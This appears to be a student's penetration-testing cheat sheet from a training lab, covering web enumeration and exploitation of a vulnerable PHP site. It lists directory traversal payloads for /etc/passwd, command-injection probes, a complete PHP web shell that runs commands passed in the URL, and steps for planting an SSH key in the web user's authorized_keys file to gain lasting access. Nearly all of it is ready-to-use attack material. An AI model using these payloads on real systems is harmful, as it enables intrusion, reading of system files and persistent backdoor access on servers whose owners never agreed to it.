#Web enumeration
1.scanning
  nmap -Pn -T5 --script=http-enum.nse <ip> -p 80
  nmap -Pn -T5 --script=http-robots.txt.nse <ip> -p 80
  nmap -Pn -T5 --script=http-sql-injection.nse <ip>
  
  legitimize
  ex:
  /robots.txt  <== legit
  /java/  <== legit
  /path/  <== legit
  /uploads/  <== legit
  /cross /  <== legit

2.robots.txt
  go here and if there are more in here then go to them
  
  
#Web Exploitation
1. Directory Traversal - Info
   ../../../../../../../../../../../../../../etc/passwd

   /etc/passwd
   /etc/group
   /etc/hosts
   /etc/networks
   /etc/resolv.conf
   /etc/os-release

   http://10.50.41.203/path/pathdemo.php?myfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&submit=File+look+up
   http://10.50.41.203/path/pathdemo.php?=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
   
2. Command injection - Info/Access
   #is there is a spot to put in text and press enter, see if putting in these will give an output
   ../../../../../../../../../../../../../../etc/passwd
   ; id
   ; whoami

3. Web SHell - Info/Access
   1. Can you upload? Yes 
   2. Is your uploads being sanitized? No  (http://0.0.0.0:0000/uploads)
   3. Can you access the uploads directory? Yes

   ##### webshell.php ####
   <HTML><BODY>
   <Form METHOD="GET" NAME="badform" ACTION="">
   <INPUT TYPE="text" NAME="cmd">
   <INPUT TYPE="submit" VALUE="hello">
   </Form>
   <?php system($_GET['cmd']);?>
   </BODY></HTML>
   ##### webshell.php ####
   
   
2a (CmdInj)/3a (WebShell). SSh keys - Access
1. Determine who the user is
   ;id
   ;who   

2. Determine user's home directory
   ;cat /etc/passwd
   
   ex.
   www-data:x:33:33:www-data:/var/www:/bin/bash
   www-data = user
   /var/www = www-data's home directory
   /bin/bash = login shell

3. Generate SSH keys from the workstation you will login from
   ssh-keygen -t rsa -b 4096
   [Enter]
   [Y] to Overwrite
   [Enter]

   cd /home/student/.ssh
   ls
   id_rsa = private
   id_rsa.pub = public   <=== key to be uploaded on target

   cat id_rsa.pub
   ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCzc7fGxYzYunC/P7RHhDqSNPC9M8pAk2S8qXQV/LTVvfmapeFrvKpFOWUdgM2ekNbVNESZgFhzg4SFd1IhZuQIj+JrxBDUpu+cz3rr52FV0IWnPQr9hc/c6SIigWYhLVsDvR1i9sPSl+/SaG5FPxnZ+pBpKzaFfsydIWbDUImWe23AgAviRJ8G2IMgFjQxEenJqyNcmO/nKUWlUZN1rX2fzgwM7mTmV8rUs0f+jxKoFi9wTzX0apYhGD7qRTJ9qyDYU5HfuHSi0hcBi5eCDgwFwjgBBG9Gmc8CaoPGeWleV9PkbcuyhxDeNd42l7RLarPI0e5o4xZ3dmu3qq9w621QQd08ys6dltWQspPTy65LRPq8srCrFFHg+RU6tgSYkJRnB12Urf4YtYB0nmDYXDgCpoFpa90sbnWSUl8uPeH1aic1SbGGhFyjDTEtZsrdxHjPRFXn8tOXOrXewCrBGYAQiCKA6kZ9nCTZCpvnHIHOUx9zqzqzScK8MiwSkxvCX4lKXvzZxwjzQSDpEvcEqgZtkgPTve8llkqrYLCZJVux1GaQDgwBngplEuqON6Sq+xDE1xE4KyefCG5OwIZo/oWsrl2E1KFNqaqu+AoiiLhaQJWeVzrDevK9pAJv6ZROo/EQ38KJeHaLOtqDlJyZYWW+gTzrJnjmr7uFeAKDImYk7w== student@lin-ops

4. On target machine, validate directories
   Validate .ssh/ exist in the user's home directory
   ;ls -la /var/www
      *ssh directory doesnt exist
   ;mkdir /var/www/.ssh
   ;ls -la /var/www
   
5. Upload SSH key to authorized_key file
   ;echo "" > /var/www/.ssh/authorized_keys
     ;echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCzc7fGxYzYunC/P7RHhDqSNPC9M8pAk2S8qXQV/LTVvfmapeFrvKpFOWUdgM2ekNbVNESZgFhzg4SFd1IhZuQIj+JrxBDUpu+cz3rr52FV0IWnPQr9hc/c6SIigWYhLVsDvR1i9sPSl+/SaG5FPxnZ+pBpKzaFfsydIWbDUImWe23AgAviRJ8G2IMgFjQxEenJqyNcmO/nKUWlUZN1rX2fzgwM7mTmV8rUs0f+jxKoFi9wTzX0apYhGD7qRTJ9qyDYU5HfuHSi0hcBi5eCDgwFwjgBBG9Gmc8CaoPGeWleV9PkbcuyhxDeNd42l7RLarPI0e5o4xZ3dmu3qq9w621QQd08ys6dltWQspPTy65LRPq8srCrFFHg+RU6tgSYkJRnB12Urf4YtYB0nmDYXDgCpoFpa90sbnWSUl8uPeH1aic1SbGGhFyjDTEtZsrdxHjPRFXn8tOXOrXewCrBGYAQiCKA6kZ9nCTZCpvnHIHOUx9zqzqzScK8MiwSkxvCX4lKXvzZxwjzQSDpEvcEqgZtkgPTve8llkqrYLCZJVux1GaQDgwBngplEuqON6Sq+xDE1xE4KyefCG5OwIZo/oWsrl2E1KFNqaqu+AoiiLhaQJWeVzrDevK9pAJv6ZROo/EQ38KJeHaLOtqDlJyZYWW+gTzrJnjmr7uFeAKDImYk7w== student@lin-ops
     " >> /var/www/.ssh/authorized_keys

6. Confirm SSH key upload
   ;cat /var/www/.ssh/authorized_keys
   
7. Login from the workstation the key was created
   ssh www-data@<target ip>   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
